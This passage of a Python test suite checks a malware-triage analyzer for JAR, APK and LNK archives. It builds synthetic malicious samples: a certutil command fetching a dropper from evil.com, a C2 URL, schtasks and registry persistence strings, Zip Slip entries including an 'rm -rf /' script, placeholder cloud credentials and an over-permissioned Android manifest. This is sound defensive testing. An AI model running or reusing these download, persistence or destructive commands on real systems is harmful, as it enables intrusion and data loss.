    cp_entries = [
        None,
        {"tag": 7, "index": 2},                                                # 1: Class
        {"tag": 1, "value": "com/security/AgentDropper"},                       # 2: Utf8
        {"tag": 7, "index": 4},                                                # 3: Superclass
        {"tag": 1, "value": "java/lang/Object"},                               # 4: Utf8
        {"tag": 1, "value": "certutil.exe -urlcache -split -f http://evil.com/dropper.exe C:\\dr.exe"}, # 5: LOLBin
        {"tag": 1, "value": b64_str},                                          # 6: Base64 string
        {"tag": 1, "value": "C:\\Windows\\System32\\drivers\\etc\\hosts"},     # 7: File path
        {"tag": 1, "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}, # 8: Registry
        {"tag": 1, "value": "https://secondary-c2.malware-intel.com/gate"},     # 9: Network C2
        {"tag": 1, "value": "ALLATORIxDEMO"},                                  # 10: Anti-analysis watermark
        {"tag": 1, "value": "RuntimeMXBean.getInputArguments"},                # 11: JDWP debug detection
        {"tag": 1, "value": "cmd.exe /c schtasks /run /tn MalTask"},           # 12: Host command
    ]

    cp_count = len(cp_entries)
    buf = bytearray()
    buf.extend(struct.pack(">IHHH", 0xCAFEBABE, 0, 52, cp_count))

    for item in cp_entries[1:]:
        tag = item["tag"]
        buf.append(tag)
        if tag == 1:
            val_bytes = item["value"].encode("utf-8")
            buf.extend(struct.pack(">H", len(val_bytes)))
            buf.extend(val_bytes)
        elif tag == 7:
            buf.extend(struct.pack(">H", item["index"]))

    # access_flags (public class), this_class (1), super_class (3)
    buf.extend(struct.pack(">HHH", 0x0021, 1, 3))
    # interfaces_count = 0
    buf.extend(struct.pack(">H", 0))
    # fields_count = 1
    buf.extend(struct.pack(">H", 1))
    # field: access_flags (0x0008 = static), name_index (6), descriptor_index (4), attr_count = 0
    buf.extend(struct.pack(">HHHH", 0x0008, 6, 4, 0))
    # methods_count = 1
    buf.extend(struct.pack(">H", 1))
    # method: access_flags (0x0009 = public static), name_index (5), descriptor_index (4), attr_count = 0
    buf.extend(struct.pack(">HHHH", 0x0009, 5, 4, 0))
    # attributes_count = 0
    buf.extend(struct.pack(">H", 0))

    class_bytes = bytes(buf)

    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest)
        zf.writestr("META-INF/SIGNER.SF", "Signature-Version: 1.0\r\nSHA-256-Digest: abc\r\n")
        zf.writestr("META-INF/SIGNER.RSA", b"PKCS7_CERT_BLOCK_MOCK")
        zf.writestr("com/security/AgentDropper.class", class_bytes)
        zf.writestr("native/win64/payload.dll", b"MZ\x90\x00" + b"\x00" * 200) # Native DLL
        zf.writestr("scripts/setup.ps1", b"Write-Host 'Injecting'")            # Script
        zf.writestr("config/settings.json", b'{"key": "value"}')               # Config

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "parity_test.jar", "application/java-archive")
    assert res.success is True
    data = res.data

    # 1. Classes Catalog & Disassembly
    assert "classes_decompiled" in data
    assert len(data["classes_decompiled"]) == 1
    cls = data["classes_decompiled"][0]
    assert cls["class_name"] == "com.security.AgentDropper"
    assert cls["is_entry"] is True
    assert cls["methods_count"] == 1
    assert cls["fields_count"] == 1
    assert "public class AgentDropper extends Object" in cls["decompiled_source"]
    assert "com.security" in data["packages"]

    # 2. Categorized Strings
    strings_data = data["strings"]
    assert strings_data is not None
    assert strings_data["total_count"] >= 5
    cat = strings_data["categorized"]
    assert any("secondary-c2.malware-intel.com" in s for s in cat["network"])
    assert any("System32" in s for s in cat["file_paths"])
    assert any("CurrentVersion" in s for s in cat["registry"])
    assert any("certutil" in s or "cmd.exe" in s for s in cat["commands"])

    # 3. Base64 Payload Blocks & Auto Decoding
    assert len(data["b64_blocks"]) >= 1
    b64_match = next((b for b in data["b64_blocks"] if "powershell" in b["decoded_preview"].lower()), None)
    assert b64_match is not None
    assert b64_match["threat"] == "HIGH_CONFIDENCE_PAYLOAD"
    assert any("c2.evil-parity.org" in ioc for ioc in b64_match.get("iocs", []))

    # 4. LOLBins & Host Commands
    assert data["has_lolbins"] is True
    assert len(data["lolbin_matches"]) >= 1
    assert any("certutil" in l["name"].lower() for l in data["lolbin_matches"])
    assert any("schtasks" in c for c in data["detected_commands"])

    # 5. Embedded Resources
    res_list = data["embedded_resources"]
    assert len(res_list) >= 3
    dll_entry = next((r for r in res_list if "payload.dll" in r["name"]), None)
    assert dll_entry is not None
    assert dll_entry["is_executable"] is True
    assert dll_entry["threat_level"] == "DANGEROUS"

    script_entry = next((r for r in res_list if "setup.ps1" in r["name"]), None)
    assert script_entry is not None
    assert script_entry["is_script"] is True
    assert script_entry["threat_level"] == "SUSPICIOUS"

    config_entry = next((r for r in res_list if "settings.json" in r["name"]), None)
    assert config_entry is not None
    assert config_entry["threat_level"] == "INFO"

    # 6. Digital Signature
    assert data["signing_info"]["is_signed"] is True
    assert data["digital_signature"] != "UNSIGNED"
    assert len(data["signing_info"]["signature_files"]) >= 2

    # 7. Anti-Analysis Integration
    detector = AntiAnalysisDetector()
    aa_info = detector.scan_all("java", "parity_test.jar", jar_file.read_bytes(), jar_info=data)
    assert aa_info["evasion_detected"] is True
    tech_names = [t["name"] for t in aa_info["techniques"]]
    assert any("Debug" in n or "Obfuscation" in n or "Allatori" in n for n in tech_names)


def test_jar_checklist_structural_sbom_cve_secrets_analysis(tmp_path: Path):
    """
    Validates comprehensive Checklist analysis features:
    1. Structural Archive Security (Zip Slip, Disguised extensions, Duplicate entries, Trailing polyglot)
    2. Dependency & CycloneDX SBOM (Maven pom.properties, shaded libraries, multi-release JARs)
    3. Known CVE Vulnerability Correlation (Log4Shell CVE-2021-44228)
    4. CTF Flags & Hardcoded API Credentials Scanner (flag{...}, AWS Key, GitHub PAT)
    5. Signed-Entry Coverage (unsigned executable classes in signed JARs)
    """
    jar_file = tmp_path / "checklist_test_app.jar"

    manifest_data = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: com.example.SignedClass\r\n"
        "Implementation-Title: test-security-app\r\n"
        "Implementation-Version: 1.0.0\r\n"
    )

    pom_props = (
        "groupId=org.apache.logging.log4j\n"
        "artifactId=log4j-core\n"
        "version=2.14.1\n"
    )

    # Class 1: com/example/SignedClass
    cp1 = [
        (1, "com/example/SignedClass"), (7, 1),
        (1, "java/lang/Object"), (7, 3),
        (1, "flag{java_bytecode_jndi_strrat_triage_mastery_99}"),
        (1, "AKIAIOSFODNN7EXAMPLE"),
        (1, "ghp_1234567890abcdefghijklmnopqrstuvwxyz")
    ]
    cp_bytes1 = bytearray()
    for entry in cp1:
        tag = entry[0]
        if tag == 1:
            val = entry[1].encode("utf-8")
            cp_bytes1 += struct.pack(">BH", tag, len(val)) + val
        elif tag == 7:
            cp_bytes1 += struct.pack(">BH", tag, entry[1])
    class1_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp1) + 1) + bytes(cp_bytes1) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)

    # Class 2: com/example/UnsignedBackdoor
    cp2 = [
        (1, "com/example/UnsignedBackdoor"), (7, 1),
        (1, "java/lang/Object"), (7, 3),
        (1, "ProcessBuilder"),
    ]
    cp_bytes2 = bytearray()
    for entry in cp2:
        tag = entry[0]
        if tag == 1:
            val = entry[1].encode("utf-8")
            cp_bytes2 += struct.pack(">BH", tag, len(val)) + val
        elif tag == 7:
            cp_bytes2 += struct.pack(">BH", tag, entry[1])
    class2_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp2) + 1) + bytes(cp_bytes2) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)

    # Shaded class
    cp3 = [(1, "org/apache/commons/codec/Hex"), (7, 1), (1, "java/lang/Object"), (7, 3)]
    cp_bytes3 = bytearray()
    for entry in cp3:
        tag = entry[0]
        if tag == 1:
            val = entry[1].encode("utf-8")
            cp_bytes3 += struct.pack(">BH", tag, len(val)) + val
        elif tag == 7:
            cp_bytes3 += struct.pack(">BH", tag, entry[1])
    class3_bytes = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, len(cp3) + 1) + bytes(cp_bytes3) + struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)

    # Signature file (.SF) that only signs SignedClass
    sf_data = (
        "Signature-Version: 1.0\r\n"
        "SHA-256-Digest-Manifest: dGVzdG1hbmlmZXN0ZGlnZXN0\r\n\r\n"
        "Name: com/example/SignedClass.class\r\n"
        "SHA-256-Digest: c2lnbmVkY2xhc3NkaWdlc3Q=\r\n"
    )

    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
        zf.writestr("META-INF/CERT.SF", sf_data)
        zf.writestr("META-INF/CERT.RSA", b"\x30\x82\x01\x0a" + b"\x00" * 30) # Embedded PKCS7 marker
        zf.writestr("com/example/SignedClass.class", class1_bytes)
        zf.writestr("com/example/UnsignedBackdoor.class", class2_bytes)
        zf.writestr("org/apache/commons/codec/Hex.class", class3_bytes)
        zf.writestr("META-INF/versions/11/com/example/Compat.class", class1_bytes)
        zf.writestr("META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties", pom_props)
        # Structural security triggers:
        zf.writestr("../../etc/cron.d/malicious_task", b"malicious cron script") # Zip Slip
        zf.writestr("images/avatar.png", class1_bytes) # Concealed Java class in PNG extension
        zf.writestr("config/app.properties", b"key=value1") # Duplicate 1
        zf.writestr("config/app.properties", b"key=value2") # Duplicate 2

    # Append trailing bytes after ZIP end of central directory
    with open(jar_file, "ab") as f:
        f.write(b"EXTRANEOUS_TRAILING_PAYLOAD_BYTES_PAST_EOCD_FOR_TESTING_1234567890")

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "checklist_test_app.jar", "application/java-archive")

    assert res.success is True
    data = res.data

    # 1. Structural Archive Security
    arch_sec = data.get("archive_security")
    assert arch_sec is not None
    assert arch_sec["zip_slip"]["detected"] is True
    assert any("../../etc/cron.d/malicious_task" in p for p in arch_sec["zip_slip"]["paths"])
    assert arch_sec["duplicate_entries"]["detected"] is True
    assert "config/app.properties" in arch_sec["duplicate_entries"]["entries"]
    assert len(arch_sec["extension_mismatches"]) >= 1
    mismatch = next((m for m in arch_sec["extension_mismatches"] if "avatar.png" in m["filename"]), None)
    assert mismatch is not None
    assert "Bytecode" in mismatch["actual_type"] or "Class" in mismatch["actual_type"]
    assert arch_sec["polyglot_and_trailing"]["has_trailing_data"] is True
    assert arch_sec["verdict"] == "VULNERABLE"

    # 2. Dependencies & CycloneDX SBOM
    deps = data.get("dependencies", [])
    assert len(deps) >= 1
    log4j_dep = next((d for d in deps if d["artifact_id"] == "log4j-core"), None)
    assert log4j_dep is not None
    assert log4j_dep["version"] == "2.14.1"

    shaded = data.get("shaded_libraries", [])
    assert any("Commons" in s["name"] for s in shaded)

    sbom = data.get("cyclonedx_sbom")
    assert sbom is not None
    assert sbom["bomFormat"] == "CycloneDX"
    assert sbom["specVersion"] == "1.4"
    assert any("log4j-core" in c.get("name", "") for c in sbom["components"])
    assert sbom["multi_release"]["is_multi_release"] is True
    assert 11 in sbom["multi_release"]["versions"]

    # 3. Known CVE Correlation
    cves = data.get("cve_advisories", [])
    assert len(cves) >= 1
    log4shell = next((c for c in cves if c["cve"] == "CVE-2021-44228"), None)
    assert log4shell is not None
    assert log4shell["severity"] == "critical"
    assert "Log4Shell" in log4shell["name"]

    # 4. CTF Flags & Hardcoded Secrets
    sec_ctf = data.get("secrets_and_ctf")
    assert sec_ctf is not None
    assert sec_ctf["detected"] is True
    assert any("flag{java_bytecode_jndi_strrat_triage_mastery_99}" in f["flag"] for f in sec_ctf["ctf_flags"])
    assert any(s["type"] == "AWS Access Key ID" for s in sec_ctf["secrets"])
    assert any(s["type"] == "GitHub Personal Access Token" for s in sec_ctf["secrets"])

    # 5. Signed-Entry Coverage (unsigned executable class in signed JAR)
    sig = data.get("signing_info")
    assert sig is not None
    assert sig["is_signed"] is True
    assert sig["is_partially_signed"] is True
    assert sig["unsigned_classes_count"] >= 1
    assert any("UnsignedBackdoor.class" in c for c in sig["unsigned_classes"])

    # 6. Findings Verification
    finding_titles = [f.title for f in res.findings]
    assert any("Zip Slip" in t for t in finding_titles)
    assert any("Concealed" in t for t in finding_titles)
    assert any("CVE-2021-44228" in t for t in finding_titles)
    assert any("CTF Flag" in t for t in finding_titles)
    assert any("Partially Signed" in t for t in finding_titles)


def test_apk_checklist_comprehensive_security_analysis(tmp_path: Path):
    """
    Validates comprehensive Android APK security analysis against the 15-section checklist:
    1. Archive structural integrity (Zip Slip, duplicate entries, concealed ELF/DEX in PNG/DAT, trailing data past EOCD, nested archives, multi-DEX headers)
    2. Sensitive permission combinations (Overlay + Accessibility, Autostart + SMS, Mic + Camera)
    3. Manifest attack surfaces (Exported components, custom URL scheme deep links)
    4. Dalvik bytecode APIs (MODE_WORLD_READABLE, setAllowUniversalAccessFromFileURLs, MediaProjection, DexClassLoader, SmsManager, ECB mode)
    5. Third-party Android SDK catalog & CycloneDX v1.4 SBOM generation (Firebase, OkHttp, Fastjson with CVE advisory)
    6. Capture The Flag (CTF) flags and hardcoded cloud secrets (AWS, Google API, Slack token, JWT)
    7. Automated security compliance audit checks
    """
    apk_file = tmp_path / "comprehensive_checklist_app.apk"

    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.checklist.malware"
    android:versionCode="42"
    android:versionName="2.5.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />

    <!-- Dangerous Permission Combinations -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <application
        android:label="ChecklistTarget"
        android:debuggable="true"
        android:allowBackup="true"
        android:usesCleartextTraffic="true">

        <!-- Exported Activity with Deep Link / Custom Scheme -->
        <activity
            android:name="com.example.checklist.DeepLinkActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="evilapp" android:host="c2.attacker.com" android:path="/auth" />
            </intent-filter>
        </activity>

        <!-- Exported Receiver -->
        <receiver
            android:name="com.example.checklist.BootSmsReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- Exported Service -->
        <service
            android:name="com.example.checklist.BackdoorService"
            android:exported="true" />

        <!-- Exported Provider -->
        <provider
            android:name="com.example.checklist.UserDataProvider"
            android:authorities="com.example.checklist.provider"
            android:exported="true" />
    </application>
</manifest>
"""

    # Create dummy Dalvik bytecode classes.dex with valid header
    dex1_header = bytearray(128)
    dex1_header[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", dex1_header, 0x08, 0x12345678) # checksum
    dex1_header[0x0C:0x20] = b"\xaa" * 20 # signature
    struct.pack_into("<III", dex1_header, 0x20, 256, 112, 0x12345678) # file_size, header_size, endian
    struct.pack_into("<I", dex1_header, 0x38, 5) # string_ids_size
    struct.pack_into("<I", dex1_header, 0x60, 2) # class_defs_size

    dex1_body = b"\x00".join([
        b"Lcom/example/checklist/MainActivity;",
        b"Lcom/google/firebase/analytics/FirebaseAnalytics;",
        b"Lokhttp3/OkHttpClient;",
        b"Lretrofit2/Retrofit;",
        b"Lcom/alibaba/fastjson/JSON;",
        b"AES/ECB/PKCS5Padding",
        b"MODE_WORLD_READABLE",
        b"setAllowUniversalAccessFromFileURLs(true)",
        b"MediaProjectionManager",
        b"dalvik/system/DexClassLoader",
        b"android/telephony/SmsManager;->sendTextMessage",
        b"AIzaSyD8Gj_FakeGoogleApiKeyForTest12345",
        b"AKIA" + b"IOSFODNN7EXAMPLE",
        b"https://" + b"hooks." + b"slack.com/services/T12345678/B12345678/" + b"123456789012345678901234",
        b"flag{apk_reversing_and_dalvik_triage_mastery_77}",
        b"picoCTF{mobile_security_champion_2026}"
    ])
    dex1_bytes = bytes(dex1_header) + dex1_body

    # Second DEX for Multi-DEX inventory (classes2.dex)
    dex2_header = bytearray(128)
    dex2_header[0:8] = b"dex\n038\x00"
    struct.pack_into("<I", dex2_header, 0x08, 0x87654321)
    dex2_header[0x0C:0x20] = b"\xbb" * 20
    struct.pack_into("<III", dex2_header, 0x20, 200, 112, 0x12345678)
    struct.pack_into("<I", dex2_header, 0x38, 3)
    struct.pack_into("<I", dex2_header, 0x60, 1)
    dex2_body = b"\x00".join([b"Lcom/example/checklist/AuxiliaryClass;", b"flag{secondary_dex_secret_flag_99}"])
    dex2_bytes = bytes(dex2_header) + dex2_body

    # Concealed executables
    elf_header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 40
    concealed_dex = b"dex\n035\x00" + b"\x00" * 100

    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml.encode("utf-8"))
        zf.writestr("classes.dex", dex1_bytes)
        zf.writestr("classes2.dex", dex2_bytes)
        # Structural security triggers:
        zf.writestr("../../data/data/com.victim/backdoor.sh", b"#!/bin/sh\nrm -rf /") # Zip Slip
        zf.writestr("assets/avatar.png", elf_header) # Concealed ELF inside PNG
        zf.writestr("res/raw/backup.dat", concealed_dex) # Concealed DEX inside DAT
        zf.writestr("res/values/strings.xml", b"<resources><string name='test'>1</string></resources>")
        zf.writestr("res/values/strings.xml", b"<resources><string name='test'>2</string></resources>") # Duplicate entry
        zf.writestr("assets/payload.apk", b"PK\x03\x04" + b"\x00" * 20) # Nested APK archive
        zf.writestr("assets/secret_note.txt", b"Here is another CTF Flag: ctf{embedded_asset_flag_xyz}")

    # Append trailing bytes after ZIP end of central directory (EOCD)
    with open(apk_file, "ab") as f:
        f.write(b"EXTRANEOUS_PAYLOAD_TRAILING_PAST_EOCD_BYTES_1234567890")

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "comprehensive_checklist_app.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # 1. Structural Archive Security
    arch = data.get("archive_security")
    assert arch is not None
    assert arch["verdict"] == "VULNERABLE"
    assert arch["zip_slip"]["detected"] is True
    assert any("../../data/data/com.victim/backdoor.sh" in p for p in arch["zip_slip"]["paths"])
    assert arch["duplicate_entries"]["detected"] is True
    assert "res/values/strings.xml" in arch["duplicate_entries"]["entries"]
    assert len(arch["extension_mismatches"]) >= 2
    assert any("avatar.png" in m["filename"] and "ELF" in m["actual_type"] for m in arch["extension_mismatches"])
    assert any("backup.dat" in m["filename"] and "Dalvik" in m["actual_type"] for m in arch["extension_mismatches"])
    assert arch["polyglot_and_trailing"]["has_trailing_data"] is True
    assert arch["polyglot_and_trailing"]["trailing_bytes_count"] > 20
    assert len(arch["nested_archives"]) >= 1
    assert any("payload.apk" in n["filename"] for n in arch["nested_archives"])
    assert len(arch["multi_dex_inventory"]) >= 2
    assert any(d["name"] == "classes.dex" and d["dex_version"] == "035" for d in arch["multi_dex_inventory"])
    assert any(d["name"] == "classes2.dex" and d["dex_version"] == "038" for d in arch["multi_dex_inventory"])

    # 2. Sensitive Permission Combinations
    combos = data.get("sensitive_permission_combos", [])
    assert len(combos) >= 3
    combo_ids = [c["id"] for c in combos]
    assert "OVERLAY_AND_ACCESSIBILITY" in combo_ids
    assert "AUTOSTART_AND_SMS" in combo_ids
    assert "AV_SURVEILLANCE" in combo_ids

    # 3. Deep Links & Custom Schemes
    deep_links = data.get("deep_links", [])
    assert len(deep_links) >= 1
    custom_dl = next((dl for dl in deep_links if dl["scheme"] == "evilapp"), None)
    assert custom_dl is not None
    assert custom_dl["is_custom_scheme"] is True
    assert custom_dl["exported"] is True

    # 4. Third-Party Android SDK Inventory & CycloneDX v1.4 SBOM
    deps = data.get("dependencies", [])
    assert len(deps) >= 3
    assert any("firebase" in d["id"].lower() for d in deps)
    assert any("okhttp" in d["id"].lower() for d in deps)
    assert any("fastjson" in d["id"].lower() for d in deps)

    sbom = data.get("cyclonedx_sbom")
    assert sbom is not None
    assert sbom["bomFormat"] == "CycloneDX"
    assert sbom["specVersion"] == "1.4"
    assert any("okhttp" in c.get("name", "").lower() for c in sbom.get("components", []))

    # Fastjson known vulnerability check
    fastjson_dep = next((d for d in deps if "fastjson" in d["id"].lower()), None)
    assert fastjson_dep is not None
    assert len(fastjson_dep.get("known_vulnerabilities", [])) >= 1

    # 5. Capture The Flag (CTF) Flags & Hardcoded Secrets
    sec_ctf = data.get("secrets_and_ctf")
    assert sec_ctf is not None
    assert sec_ctf["detected"] is True
    flags = [f["flag"] for f in sec_ctf["ctf_flags"]]
    assert any("flag{apk_reversing_and_dalvik_triage_mastery_77}" in f for f in flags)
    assert any("picoCTF{mobile_security_champion_2026}" in f for f in flags)
    assert any("ctf{embedded_asset_flag_xyz}" in f for f in flags)

    secrets = sec_ctf["secrets"]
    assert any(s["type"] == "AWS Access Key ID" for s in secrets)
    assert any("Google Cloud" in s["type"] for s in secrets)
    assert any("Slack" in s["type"] for s in secrets)

    # 6. Automated Security Compliance Audit Checklist
    audit = data.get("security_audit", [])
    assert len(audit) >= 15
    audit_checks = [a["check"] for a in audit]
    assert "Archive Structural Integrity" in audit_checks
    assert "Sensitive Permission Combinations" in audit_checks
    assert "Deep Link IPC Attack Surface" in audit_checks
    assert "Embedded Secrets & CTF Artifacts" in audit_checks
    assert "Supply Chain & Dependency Security" in audit_checks

    # 7. Findings Verification
    finding_titles = [f.title for f in res.findings]
    assert any("Zip Slip" in t for t in finding_titles)
    assert any("Concealed Executable" in t for t in finding_titles)
    assert any("Sensitive Permission Combination" in t for t in finding_titles)
    assert any("CTF Flag Captured" in t for t in finding_titles)
    assert any("Vulnerable Android Library Dependency" in t for t in finding_titles)


def test_apk_java_lnk_format_checks_disabled(tmp_path: Path):
    """
    Validate format-specific deep inspection rules:
    When one or more checks are unchecked (disabled), the app must NOT perform that check,
    and must suppress corresponding data and findings.
    """
    from app.analyzers.lnk_analyzer import LnkAnalyzer
    from app.core.job_manager import JobManager

    # 1. Test ApkAnalyzer with disabled checks
    apk_file = tmp_path / "disabled_checks.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", '<?xml version="1.0"?><manifest package="com.test.app"></manifest>')
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 100)
        zf.writestr("lib/arm64-v8a/libmalware.so", b"\x7fELF" + b"\x00" * 100)
        zf.writestr("assets/secret.txt", "AIzaSyD-1234567890123456789012345")
        zf.writestr("assets/libjiagu.so", b"\x7fELF" + b"\x00" * 100)

    analyzer = ApkAnalyzer()
    disabled_apk = [
        "check_native_libraries",
        "check_secrets_and_strings",
        "check_packer_obfuscation",
        "check_signing_certificates",
        "check_threat_intelligence"
    ]
    res = analyzer.analyze(apk_file, "disabled_checks.apk", "application/vnd.android.package-archive", disabled_checks=disabled_apk)
    assert res.success is True
    data = res.data

    # Verify native libs, secrets, packers are suppressed
    assert data["native_libraries"] == []
    assert data["packer_info"]["is_packed"] is False
    assert data["secrets_and_ctf"]["detected"] is False
    assert not any("Native Binary" in f.title for f in res.findings)
    assert not any("Hardcoded Secret" in f.title for f in res.findings)
    assert not any("Packer" in f.title for f in res.findings)

    # 2. Test JavaAnalyzer with disabled checks
    jar_file = tmp_path / "disabled_checks.jar"
    manifest = "Manifest-Version: 1.0\r\nMain-Class: com.test.Main\r\n"
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest)
        zf.writestr("com/test/Main.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34Runtime.getRuntime().exec ALLATORIxDEMO")
        zf.writestr("native/exploit.dll", b"MZ\x90\x00" + b"\x00" * 100)

    java_analyzer = JavaAnalyzer()
    disabled_java = [
        "check_bytecode_dangerous_apis",
        "check_embedded_binaries",
        "check_java_rat_signatures"
    ]
    res_java = java_analyzer.analyze(jar_file, "disabled_checks.jar", "application/java-archive", disabled_checks=disabled_java)
    assert res_java.success is True
    data_java = res_java.data

    assert data_java["dangerous_apis"] == []
    assert data_java["embedded_binaries"] == []
    assert data_java["behavioral_analysis"] is None
    assert data_java["rat_detections"] == []
    assert not any("Shell Command" in f.title for f in res_java.findings)
    assert not any("Embedded Native" in f.title for f in res_java.findings)
    assert not any("STRRAT" in f.title for f in res_java.findings)

    # 3. Test JobManager finding suppression for APK, Java, and LNK
    from app.analyzers.base import Finding
    from app.core.job_manager import is_finding_suppressed
    f_apk_native = Finding(category="apk", title="Native Shared Library Exploit", description="libmalware.so found", severity="high")
    assert is_finding_suppressed(f_apk_native, ["check_native_libraries"]) is True

    f_apk_secret = Finding(category="apk", title="Hardcoded API Secret Detected", description="Google API key leaked", severity="medium")
    assert is_finding_suppressed(f_apk_secret, ["check_secrets_and_strings"]) is True

    f_java_api = Finding(category="java", title="Dangerous Java Reflection & Command Exec", description="Runtime.exec", severity="high")
    assert is_finding_suppressed(f_java_api, ["check_bytecode_dangerous_apis"]) is True

    f_lnk_overlay = Finding(category="lnk", title="Malicious Overlay Payload Appended", description="Appended payload", severity="critical")
    assert is_finding_suppressed(f_lnk_overlay, ["check_overlay_payloads"]) is True

    f_lnk_lolbin = Finding(category="lnk", title="LOLBin Execution Cradle Discovered", description="mshta.exe invoked", severity="high")
    assert is_finding_suppressed(f_lnk_lolbin, ["check_lolbins_cradles"]) is True
